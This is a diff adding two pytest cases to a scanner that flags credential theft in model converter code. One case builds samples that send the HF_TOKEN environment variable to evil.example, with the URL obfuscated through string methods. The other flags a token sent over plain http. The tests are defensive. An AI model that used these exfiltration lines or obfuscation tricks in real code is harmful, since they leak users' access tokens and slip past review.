@@ -4791,6 +4791,61 @@ def test_a_decoded_literal_and_a_scheme_built_a_character_at_a_time():
     ) == []
 
 
+def test_a_literal_transformed_by_any_unreadable_method_refuses_it():
+    """Named methods were losing one at a time: replace with dynamic
+    arguments, decode of UTF-16 bytes, split indexed back together, and then
+    "https".ljust(6, ":") turning a word into a scheme. The tail has no end, so
+    the rule asks the other question. The receiver is a literal, the result is
+    not readable, and a transformation this cannot follow is not one it can
+    vouch for.
+
+    What the folds do read stays readable, which is what keeps upstream
+    working: it transforms parameters, never constants.
+    """
+    scan_converter_source = _load(
+        "converter_scan_any_method_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    send = (
+        'requests.get(url, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    )
+    for body in (
+        'url = "https".ljust(6, ":") + "//evil.example/c"\n' + send,
+        'url = "ttps://evil.example/c".rjust(23, "h")\n' + send,
+        'url = "HTTPS://EVIL.EXAMPLE/c".lower()\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    for body in (
+        'url = "{}/api".format(HUB)\n' + send,
+        'url = HUB + "/api"\nname = base.replace(" ", "-")\n' + send,
+    ):
+        assert scan_converter_source(preamble + body) == [], body
+
+
+def test_a_token_sent_over_plaintext_refuses_the_hub_allowance():
+    """The host is the hub and the scheme is http, so the credential goes out
+    where anyone on the path can read it. The allowance exists to say nothing
+    about an ordinary authenticated download, and this is not one: upstream's
+    BASE_DOMAIN is https and so is every URL it builds.
+    """
+    scan_converter_source = _load(
+        "converter_scan_plaintext_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n'
+            'requests.get("http://huggingface.co",'
+            ' headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+        )
+    ]
+    assert scan_converter_source(
+        'import os\nimport requests\n'
+        'requests.get("https://huggingface.co",'
+        ' headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    ) == []
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
